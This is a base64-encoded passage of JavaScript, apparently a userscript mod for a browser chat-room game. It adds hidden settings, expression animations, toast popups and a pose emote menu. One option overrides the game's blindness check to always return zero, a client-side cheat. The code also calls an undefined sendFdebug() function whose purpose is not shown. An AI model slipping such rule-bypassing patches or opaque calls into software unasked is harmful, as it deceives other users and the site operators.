Z3JvdW5kQ29sb3IgPSAiI2RkZCI7CiAgb3B0aW9uMy5zdHlsZS5jdXJzb3IgPSAicG9pbnRlciI7Cn0pOwoKb3B0aW9uMy5hZGRFdmVudExpc3RlbmVyKCJtb3VzZWxlYXZlIiwgZnVuY3Rpb24oKSB7CiAgaWYgKGNoZWNrYm94My5jaGVja2VkKSB7CiAgICBvcHRpb24zLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICJsaWdodGdyZWVuIjsKICB9IGVsc2UgewogICAgb3B0aW9uMy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2YyZjJmMiI7CiAgfQp9KTsKCi8vIENoZWNrYm94IHN0YXRlIHdoZW4gdGhlIHBhZ2UgbG9hZHMKY2hlY2tib3gxLmNoZWNrZWQgPyBvcHRpb24xLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZDFmN2M0IiA6IG9wdGlvbjEuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNmMmYyZjIiOwpjaGVja2JveDIuY2hlY2tlZCA/IG9wdGlvbjIuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkMWY3YzQiIDogb3B0aW9uMi5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2YyZjJmMiI7CmNoZWNrYm94My5jaGVja2VkID8gb3B0aW9uMy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2QxZjdjNCIgOiBvcHRpb24zLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZjJmMmYyIjsKCgovLyBDaGFuZ2UgbGFiZWwgYmFja2dyb3VuZCBjb2xvciB3aGVuIHRoZSBjaGVja2JveCBpcyBjaGVja2VkCmNoZWNrYm94MS5hZGRFdmVudExpc3RlbmVyKCJjaGFuZ2UiLCBmdW5jdGlvbigpIHsKICBpZiAoY2hlY2tib3gxLmNoZWNrZWQpIHsKICAgIG9wdGlvbjEuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkMWY3YzQiOwogIH0gZWxzZSB7CiAgICBvcHRpb24xLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZjJmMmYyIjsKICB9Cn0pOwoKY2hlY2tib3gyLmFkZEV2ZW50TGlzdGVuZXIoImNoYW5nZSIsIGZ1bmN0aW9uKCkgewogIGlmIChjaGVja2JveDIuY2hlY2tlZCkgewogICAgb3B0aW9uMi5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2QxZjdjNCI7CiAgfSBlbHNlIHsKICAgIG9wdGlvbjIuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNmMmYyZjIiOwogIH0KfSk7CgpjaGVja2JveDMuYWRkRXZlbnRMaXN0ZW5lcigiY2hhbmdlIiwgZnVuY3Rpb24oKSB7CiAgaWYgKGNoZWNrYm94My5jaGVja2VkKSB7CiAgICBvcHRpb24zLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZDFmN2M0IjsKICB9IGVsc2UgewogICAgb3B0aW9uMy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2YyZjJmMiI7CiAgfQp9KTsKCi8vT3B0aW9ucyBBY3Rpb25zX19fX19fX19fX19fX19fX19fX19fX19fX19fX18KCmZ1bmN0aW9uIHJ1bk9wdGlvbjEoKSB7CiAgICBpZiAoY2hlY2tib3gxLmNoZWNrZWQpIHsKICAgICAgZnVuY3Rpb24gR2V0QmxpbmRMZXZlbDAoKSB7CiAgICAgICAgbGV0IGJsaW5kTGV2ZWwgPSAwOwogICAgICAgIHJldHVybiBibGluZExldmVsOwogICAgICB9CiAgICAgIFBsYXllci5HZXRCbGluZExldmVsID0gR2V0QmxpbmRMZXZlbDA7CiAgICAgIFBsYXllci5HZXRCbGluZExldmVsKCk7CiAgICB9CiAgfQogIAogIGZ1bmN0aW9uIHJ1bk9wdGlvbjIoKSB7CiAgICBmdW5jdGlvbiBSdW5FeHByZXNzaW9uQW5pbWF0aW9uU3RlcCgpIHsKICAgICAgQ2hhcmFjdGVyU2V0RmFjaWFsRXhwcmVzc2lvbihQbGF5ZXIsICJNb3V0aCIsIGV4cHJlc3Npb25BbmltYXRpb25bZXhwcmVzc2lvbkFuaW1hdGlvbkluZGV4KytdKTsKICAgICAgaWYgKGV4cHJlc3Npb25BbmltYXRpb25JbmRleCA8IGV4cHJlc3Npb25BbmltYXRpb24ubGVuZ3RoKSB7CiAgICAgICAgc2V0VGltZW91dChSdW5FeHByZXNzaW9uQW5pbWF0aW9uU3RlcCwgMTAwMCk7CiAgICAgIH0gZWxzZSB7CiAgICAgICAgZXhwcmVzc2lvbkFuaW1hdGlvbiA9IG51bGw7CiAgICAgIH0KICAgIH0KICAKICAgIGZ1bmN0aW9uIFJ1bkV4cHJlc3Npb25BbmltYXRpb24obGlzdCkgewogICAgICBpZiAoZXhwcmVzc2lvbkFuaW1hdGlvbikgewogICAgICAgIHJldHVybjsKICAgICAgfQogICAgICBleHByZXNzaW9uQW5pbWF0aW9uID0gbGlzdDsKICAgICAgZXhwcmVzc2lvbkFuaW1hdGlvbkluZGV4ID0gMDsKICAgICAgZXhwcmVzc2lvbkFuaW1hdGlvbkV4ID0gSW52ZW50b3J5R2V0KFBsYXllciwgIk1vdXRoIik7CiAgICAgIGlmIChleHByZXNzaW9uQW5pbWF0aW9uRXggJiYgZXhwcmVzc2lvbkFuaW1hdGlvbkV4LlByb3BlcnR5ICYmIGV4cHJlc3Npb25BbmltYXRpb25FeC5Qcm9wZXJ0eS5FeHByZXNzaW9uKSB7CiAgICAgICAgZXhwcmVzc2lvbkFuaW1hdGlvbltleHByZXNzaW9uQW5pbWF0aW9uLmxlbmd0aCAtIDFdID0gZXhwcmVzc2lvbkFuaW1hdGlvbkV4LlByb3BlcnR5LkV4cHJlc3Npb247IC8vc2V0IGxhc3QgdG8gY3VycmVudAogICAgICB9CiAgICAgIFJ1bkV4cHJlc3Npb25BbmltYXRpb25TdGVwKCk7CiAgICB9CiAgCiAgICBmdW5jdGlvbiBORVd0YWxraW5nKCkgewogICAgICB2YXIgbXNnID0gRWxlbWVudFZhbHVlKCJJbnB1dENoYXQiKS50cmltKCk7CiAgICAgIGlmICghbXNnLnN0YXJ0c1dpdGgoIi8iKSAmJiAhbXNnLnN0YXJ0c1dpdGgoIioiKSAmJiAhbXNnLnN0YXJ0c1dpdGgoIiEiKSkgewogICAgICAgIGlmIChtc2cubGVuZ3RoID4gMTApIHsKICAgICAgICAgIFJ1bkV4cHJlc3Npb25BbmltYXRpb24oW251bGwsICJHcmluIiwgIlNtaXJrIiwgbnVsbCwgIkdyaW4iLCAiU21pcmsiLCBudWxsXSk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgIFJ1bkV4cHJlc3Npb25BbmltYXRpb24oW251bGwsICJHcmluIiwgIlNtaXJrIiwgbnVsbF0pOwogICAgICAgIH0KICAgICAgfQogICAgICBPTER0YWxraW5nKCk7CiAgICB9CiAgCiAgICBpZiAoY2hlY2tib3gyLmNoZWNrZWQpIHsKICAgICAgdmFyIGV4cHJlc3Npb25BbmltYXRpb247CiAgICAgIHZhciBleHByZXNzaW9uQW5pbWF0aW9uSW5kZXggPSAwOwogICAgICB2YXIgT0xEdGFsa2luZyA9IENoYXRSb29tU2VuZENoYXQ7CiAgICAgIENoYXRSb29tU2VuZENoYXQgPSBORVd0YWxraW5nOwogICAgfQogIH0KCiAgZnVuY3Rpb24gcnVuT3B0aW9uMygpIHsKICAgIGlmIChjaGVja2JveDMuY2hlY2tlZCkgewogICAgICBmdW5jdGlvbiBzaG93VG9hc3RzY3BnKCkgewogICAgICAgIEF1ZGlvUGxheUluc3RhbnRTb3VuZCgiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvNzgxNzQ5MjI5MzMxOTM5MzI4LzEwOTA1MzA0NzkwODM2MzA2NzIvaDQydndjZC1ub3RpZmljYXRpb24tMV92TXFoVmx0Uy5tcDMiLCAxKTsKICAgICAgICAvLyBDcmVhdGUgdGhlIHRvYXN0IGNvbnRhaW5lcgogICAgICAgIHZhciB0b2FzdENvbnRhaW5lciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLnBvc2l0aW9uID0gImZpeGVkIjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5ib3R0b20gPSAiNXB4IjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5yaWdodCA9ICI1cHgiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICJ3aGl0ZSI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuY29sb3IgPSAiIzE0MTQxNCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUucGFkZGluZyA9ICI1cHgiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmJvcmRlciA9ICIycHggc29saWQgIzRDQUY1MCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuYm9yZGVyUmFkaXVzID0gIjVweCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuYm94U2hhZG93ID0gIjJweCAycHggMTBweCByZ2JhKDAsIDAsIDAsIDAuNSkiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuekluZGV4ID0gIjk5OSI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUudHJhbnNpdGlvbiA9ICJvcGFjaXR5IDAuNXMgZWFzZS1pbi1vdXQiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLm9wYWNpdHkgPSAiMCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJmbGV4IjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5hbGlnbkl0ZW1zID0gImNlbnRlciI7CiAgICAgICAgdmFyIHN0YXR1c0JhciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwogICAgc3RhdHVzQmFyLnN0eWxlLndpZHRoID0gIjEwMCUiOwogICAgc3RhdHVzQmFyLnN0eWxlLmhlaWdodCA9ICIzcHgiOwogICAgc3RhdHVzQmFyLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICJibGFjayI7CiAgICBzdGF0dXNCYXIuc3R5bGUucG9zaXRpb24gPSAiYWJzb2x1dGUiOwogICAgc3RhdHVzQmFyLnN0eWxlLmJvdHRvbSA9ICIwIjsKICAgIHN0YXR1c0Jhci5zdHlsZS5sZWZ0ID0gIjAiOwogICAgc3RhdHVzQmFyLnN0eWxlLnRyYW5zaXRpb24gPSAid2lkdGggNXMgZWFzZS1pbi1vdXQiOwogICAgc3RhdHVzQmFyLnN0eWxlLndpZHRoID0gIjAlIjsKICAgIHRvYXN0Q29udGFpbmVyLmFwcGVuZENoaWxkKHN0YXR1c0Jhcik7CiAgICAKICAgIC8vIFN0YXR1cyBiYXIgd2lkdGggd2hpbGUgY291bnRpbmcgZG93bgogICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgc3RhdHVzQmFyLnN0eWxlLndpZHRoID0gIjEwMCUiOwogICAgfSwgMCk7CiAgICB2YXIgaWNvbiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImltZyIpOwogICAgaWNvbi5zcmMgPSAiaHR0cHM6Ly9tZWRpYS5kaXNjb3JkYXBwLm5ldC9hdHRhY2htZW50cy83ODE3NDkyMjkzMzE5MzkzMjgvMTA3OTY1OTAxNjkxOTE5NTc0OC9iNjY0MTkxMTc4OTdhOTg4LnBuZz93aWR0aD0xMTkwJmhlaWdodD0xMTg5IjsKICAgIGljb24uc3R5bGUud2lkdGggPSAiMjNweCI7CiAgICBpY29uLnN0eWxlLmhlaWdodCA9ICIyM3B4IjsKICAgIGljb24uc3R5bGUuYm9yZGVyUmFkaXVzID0gIjUwJSI7CiAgICBpY29uLnN0eWxlLm1hcmdpblJpZ2h0ID0gIi0zMHB4IjsKICAgIGljb24uc3R5bGUubWFyZ2luQm90dG9tID0gIi01cHgiOwogICAgdG9hc3RDb250YWluZXIuYXBwZW5kQ2hpbGQoaWNvbik7CiAgICB2YXIgdGV4dCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNwYW4iKTsKICAgIHRleHQuc3R5bGUuZm9udFdlaWdodCA9ICJib2xkIjsKICAgIHRleHQuc3R5bGUubWFyZ2luTGVmdCA9ICIzNXB4IjsKICAgIHRleHQuaW5uZXJIVE1MID0gIkFjdGlvbiBTdWNjZXNzZnVsbHkgRXhlY3V0ZWQiOwogICAgdG9hc3RDb250YWluZXIuYXBwZW5kQ2hpbGQodGV4dCk7CiAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHRvYXN0Q29udGFpbmVyKTsKICAgICAgCiAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAiYmxvY2siOwogICAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUub3BhY2l0eSA9ICIxIjsKICAgICAgICB9LCAwKTsKICAgICAgCiAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLm9wYWNpdHkgPSAiMCI7CiAgICAgICAgfSwgNTAwMCk7CiAgICAgIAogICAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwogICAgICAgIH0sIDU1MDApOwogICAgICAgIHNlbmRGZGVidWcoKTsKICAgIAogICAgICB9CgogICAgfQogIH0KCiAgLy8gTG9hZCBjaGVja2JveCBzdGF0ZXMgZnJvbSBsb2NhbCBzdG9yYWdlCiAgaWYgKGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJvcHRpb24xIikgIT09IG51bGwpIHsKICAgIGNoZWNrYm94MS5jaGVja2VkID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oIm9wdGlvbjEiKSA9PT0gInRydWUiOwogICAgaWYgKGNoZWNrYm94MS5jaGVja2VkKSB7CiAgICAgIHNldEludGVydmFsKHJ1bk9wdGlvbjEsIDEwMDApOwogICAgfQogIH0KICAKICBpZiAobG9jYWxTdG9yYWdlLmdldEl0ZW0oIm9wdGlvbjIiKSAhPT0gbnVsbCkgewogICAgY2hlY2tib3gyLmNoZWNrZWQgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgib3B0aW9uMiIpID09PSAidHJ1ZSI7CiAgICBpZiAoY2hlY2tib3gyLmNoZWNrZWQpIHsKICAgICAgc2V0SW50ZXJ2YWwocnVuT3B0aW9uMiwgMTAwMCk7CiAgICB9CiAgfQoKICBpZiAobG9jYWxTdG9yYWdlLmdldEl0ZW0oIm9wdGlvbjMiKSAhPT0gbnVsbCkgewogICAgY2hlY2tib3gzLmNoZWNrZWQgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgib3B0aW9uMyIpID09PSAidHJ1ZSI7CiAgICBpZiAoY2hlY2tib3gzLmNoZWNrZWQpIHsKICAgICAgc2V0SW50ZXJ2YWwocnVuT3B0aW9uMywgMTAwMCk7CiAgICB9CiAgfQogIAogIGNoZWNrYm94MS5hZGRFdmVudExpc3RlbmVyKCJjaGFuZ2UiLCBmdW5jdGlvbigpIHsKICAgIGxvY2FsU3RvcmFnZS5zZXRJdGVtKCJvcHRpb24xIiwgY2hlY2tib3gxLmNoZWNrZWQpOwogICAgaWYgKGNoZWNrYm94MS5jaGVja2VkKSB7CiAgICAgIHNldEludGVydmFsKHJ1bk9wdGlvbjEsIDEwMDApOwogICAgfQogIH0pOwogIAogIGNoZWNrYm94Mi5hZGRFdmVudExpc3RlbmVyKCJjaGFuZ2UiLCBmdW5jdGlvbigpIHsKICAgIGxvY2FsU3RvcmFnZS5zZXRJdGVtKCJvcHRpb24yIiwgY2hlY2tib3gyLmNoZWNrZWQpOwogICAgaWYgKGNoZWNrYm94Mi5jaGVja2VkKSB7CiAgICAgIHNldEludGVydmFsKHJ1bk9wdGlvbjIsIDEwMDApOwogICAgfQogIH0pOwoKICBjaGVja2JveDMuYWRkRXZlbnRMaXN0ZW5lcigiY2hhbmdlIiwgZnVuY3Rpb24oKSB7CiAgICBsb2NhbFN0b3JhZ2Uuc2V0SXRlbSgib3B0aW9uMyIsIGNoZWNrYm94My5jaGVja2VkKTsKICAgIGlmIChjaGVja2JveDMuY2hlY2tlZCkgewogICAgICBzZXRJbnRlcnZhbChydW5PcHRpb24zLCAxMDAwKTsKICAgIH0KICB9KTsKICAKCi8vT3B0aW9ucyBTdGF0ZXNfX19fX19fX19fX19fX19fX19fX19fX19fX19fXwoKLy8gU2F2ZSBjaGVja2JveCBzdGF0ZXMgdG8gbG9jYWwgc3RvcmFnZSAKY2hlY2tib3gxLmFkZEV2ZW50TGlzdGVuZXIoImNoYW5nZSIsIGZ1bmN0aW9uKCkgewogIGxvY2FsU3RvcmFnZS5zZXRJdGVtKCJvcHRpb24xIiwgY2hlY2tib3gxLmNoZWNrZWQpOwp9KTsKCmNoZWNrYm94Mi5hZGRFdmVudExpc3RlbmVyKCJjaGFuZ2UiLCBmdW5jdGlvbigpIHsKICBsb2NhbFN0b3JhZ2Uuc2V0SXRlbSgib3B0aW9uMiIsIGNoZWNrYm94Mi5jaGVja2VkKTsKfSk7CgpjaGVja2JveDMuYWRkRXZlbnRMaXN0ZW5lcigiY2hhbmdlIiwgZnVuY3Rpb24oKSB7CiAgbG9jYWxTdG9yYWdlLnNldEl0ZW0oIm9wdGlvbjMiLCBjaGVja2JveDMuY2hlY2tlZCk7Cn0pOwoKCmRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoc2V0dGluZ3NNZW51KTsKCmxldCBpc0JhY2t0aWNrUHJlc3NlZCA9IGZhbHNlOwpsZXQgaXNTUHJlc3NlZCA9IGZhbHNlOwoKZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigia2V5ZG93biIsIGZ1bmN0aW9uKGV2ZW50KSB7CiAgaWYgKGV2ZW50LmtleSA9PT0gImAiKSB7CiAgICBpc0JhY2t0aWNrUHJlc3NlZCA9IHRydWU7CiAgfSBlbHNlIGlmIChldmVudC5rZXkgPT09ICJzIikgewogICAgaXNTUHJlc3NlZCA9IHRydWU7CiAgfQoKICBpZiAoaXNCYWNrdGlja1ByZXNzZWQgJiYgaXNTUHJlc3NlZCkgewogICAgc2V0dGluZ3NNZW51LnN0eWxlLmRpc3BsYXkgPSAiYmxvY2siOwogIH0KfSk7CgovLyBIaWRlIHNldHRpbmdzIG1lbnUgd2hlbiB0aGUgdXNlciBjbGlja3Mgb2ZmCmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgZnVuY3Rpb24oZXZlbnQpIHsKICAgIGNvbnN0IHRhcmdldEVsZW1lbnQgPSBldmVudC50YXJnZXQ7CiAgICBjb25zdCBpc1NldHRpbmdzTWVudSA9ICEhdGFyZ2V0RWxlbWVudC5jbG9zZXN0KCIjc2V0dGluZ3MtbWVudSIpOwogICAgCiAgICBpZiAoIWlzU2V0dGluZ3NNZW51KSB7CiAgICAgIHNldHRpbmdzTWVudS5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwogICAgfQogIH0pOwogIAogIAoKICAKCi8vIENsZWFyIGZsYWdzIHdoZW4gdGhlIHVzZXIgcmVsZWFzZXMgZWl0aGVyIGtleQpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJrZXl1cCIsIGZ1bmN0aW9uKGV2ZW50KSB7CiAgaWYgKGV2ZW50LmtleSA9PT0gImAiKSB7CiAgICBpc0JhY2t0aWNrUHJlc3NlZCA9IGZhbHNlOwogIH0gZWxzZSBpZiAoZXZlbnQua2V5ID09PSAicyIpIHsKICAgIGlzU1ByZXNzZWQgPSBmYWxzZTsKICB9Cn0pOwoKCi8vRW5kIG9mIFBlcnNpc3RhbnQgTWVudSBfX19fX19fX19fX19fX19fX19fX18KCi8vU3RhcnQgb2YgRW1vdGUgTWVudSBfX19fX19fX19fX19fX19fX19fX18KCmNvbnN0IGJ1dHRvbkRhdGEgPSBbCiAgeyBuYW1lOiAiUHVsbC1VcHMiLCBhY3Rpb246ICgpID0+IHsKICAgICAgICBzaG93VG9hc3RzY3BnKCk7CiAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsIG51bGwpOwogICAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiTGVnc09wZW4iKTsKICAgICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJPdmVyVGhlSGVhZCIpOwogICAgICAgICAgICBJbnZlbnRvcnlHZXQoUGxheWVyLCAiRW1vdGljb24iKS5Qcm9wZXJ0eS5PdmVycmlkZUhlaWdodCA9IHsKICAgICAgICAgICAgICAgIEhlaWdodDogMTMwCiAgICAgICAgICAgIH07CiAgICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgICAgfSwgMTAwMCk7CiAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJZb2tlZCIpOwogICAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIkxlZ3NDbG9zZWQiKTsKICAgICAgICAgICAgSW52ZW50b3J5R2V0KFBsYXllciwgIkVtb3RpY29uIikuUHJvcGVydHkuT3ZlcnJpZGVIZWlnaHQgPSB7CiAgICAgICAgICAgICAgICBIZWlnaHQ6IDI1MAogICAgICAgICAgICB9OwogICAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICAgIH0sIDIwMDApOwogICAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CgogICAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIkxlZ3NPcGVuIik7CiAgICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiT3ZlclRoZUhlYWQiKQogICAgICAgICAgICBJbnZlbnRvcnlHZXQoUGxheWVyLCAiRW1vdGljb24iKS5Qcm9wZXJ0eS5PdmVycmlkZUhlaWdodCA9IHsKICAgICAgICAgICAgICAgIEhlaWdodDogMTMwCiAgICAgICAgICAgIH07CiAgICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgICAgfSwgMzAwMCk7CiAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJZb2tlZCIpOwogICAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIkxlZ3NDbG9zZWQiKTsKICAgICAgICAgICAgSW52ZW50b3J5R2V0KFBsYXllciwgIkVtb3RpY29uIikuUHJvcGVydHkuT3ZlcnJpZGVIZWlnaHQgPSB7CiAgICAgICAgICAgICAgICBIZWlnaHQ6IDI1MAogICAgICAgICAgICB9OwogICAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAnQ2hhdFJvb20nID8KICAgICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICAgIH0sIDQwMDApOyAgICAKICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIkxlZ3NPcGVuIik7CiAgICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiT3ZlclRoZUhlYWQiKQogICAgICAgICAgICBJbnZlbnRvcnlHZXQoUGxheWVyLCAiRW1vdGljb24iKS5Qcm9wZXJ0eS5PdmVycmlkZUhlaWdodCA9IHsKICAgICAgICAgICAgICAgIEhlaWdodDogMTMwCiAgICAgICAgICAgIH07CiAgICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgICAgfSwgNTAwMCk7CiAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsIG51bGwpOwogICAgICAgICAgICBkZWxldGUgSW52ZW50b3J5R2V0KFBsYXllciwgJ0Vtb3RpY29uJykuUHJvcGVydHkuT3ZlcnJpZGVIZWlnaHQ7CiAgICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICdDaGF0Um9vbScgPwogICAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgICAgfSwgNjAwMCk7ICAgIAp9IH0sCiAgeyBuYW1lOiAiQ2hlZXIiLCBhY3Rpb246ICgpID0+IHsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgbnVsbCk7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIllva2VkIik7CiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDEwMDApOwogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJPdmVyVGhlSGVhZCIpOwogICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCAyMDAwKTsKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiWW9rZWQiKTsKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgMzAwMCk7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIk92ZXJUaGVIZWFkIik7CiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDQwMDApOyAgICAKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiWW9rZWQiKTsKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgNTAwMCk7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIk92ZX